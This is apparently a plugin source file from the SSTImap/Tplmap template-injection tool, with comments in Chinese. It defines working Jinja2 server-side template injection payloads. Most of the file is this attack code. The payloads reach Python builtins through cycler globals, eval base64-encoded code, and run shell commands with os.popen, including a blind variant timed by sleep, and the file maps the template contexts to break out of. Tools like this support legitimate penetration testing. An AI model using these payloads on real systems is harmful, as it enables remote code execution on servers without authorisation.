from plugins.languages import python
from utils import rand


class Jinja2(python.Python):
    priority = 5
    plugin_info = {
        "Description": 'Jinja 模板引擎',
        "Authors": [
            "@bUst4gr0 https://github.com/bUst4gr0",  # 新的 SSTImap 载荷
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # 新 SSTImap 载荷的改进
            "Emilio @epinna https://github.com/epinna",  # 原始 Tplmap 载荷
            "Jeremy Bae @opt9 https://github.com/opt9",  # 对 Tplmap 载荷的贡献
        ],
        "Engine": [
            "Homepage: https://jinja.palletsprojects.com/en/stable/",
            "Github: https://github.com/pallets/jinja",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '{{{{{header[0]}+{header[1]}}}}}',
                'trailer': '{{{{{trailer[0]}+{trailer[1]}}}}}',
                'test_render': f'{{{{({rand.randints[0]},{rand.randints[1]}*{rand.randints[2]})|e}}}}',
                'test_render_expected': f'{(rand.randints[0],rand.randints[1]*rand.randints[2])}'
            },
            'render_error': {
                'render': '{code}',
                'header': '{{{{ cycler.__init__.__globals__.__builtins__.getattr("", (({header[0]}+{header[1]})|string)+(',
                'trailer': '|string)+(({trailer[0]}+{trailer[1]})|string))}}}}',
                'test_render': f'({rand.randints[0]},{rand.randints[1]}*{rand.randints[2]})|e',
                'test_render_expected': f'{(rand.randints[0], rand.randints[1] * rand.randints[2])}'
            },
            'evaluate': {
                'call': 'render',
                'evaluate': """{{{{cycler.__init__.__globals__.__builtins__.eval(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode())}}}}"""
            },
            'evaluate_error': {
                'evaluate': """cycler.__init__.__globals__.__builtins__.eval(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode()).rstrip()"""
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """{{{{1 / (not not cycler.__init__.__globals__.__builtins__.eval(cycler.__init__.__globals__.__builtins__.__import__('base64').urlsafe_b64decode('{code_b64}').decode()))}}}}"""
            },
            'execute': {
                'call': 'render',
                'execute': """{{{{cycler.__init__.__globals__.os.popen(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode()).read()}}}}"""
            },
            'execute_error': {
                'execute': """cycler.__init__.__globals__.os.popen(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode()).read().rstrip()"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """{{{{cycler.__init__.__globals__.os.popen(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode() + ' && sleep {delay}')}}}}"""
            },
        })

        self.set_contexts([
            # 文本上下文，无闭包
            {'level': 0},
            # 这涵盖了 {{%s}}
            {'level': 1, 'prefix': '{closure}}}}}', 'suffix': '', 'closures': python.ctx_closures},
            # 这涵盖了 {% %s %}
            {'level': 1, 'prefix': '{closure}%}}', 'suffix': '', 'closures': python.ctx_closures},
            # If 和 for 块
            # # 如果 %s:\n# endif
            # # for a in %s:\n# endfor
            {'level': 5, 'prefix': '{closure}\n', 'suffix': '\n', 'closures': python.ctx_closures},
            # 评论区
            {'level': 5, 'prefix': '#}}', 'suffix': '{#'},

        ])
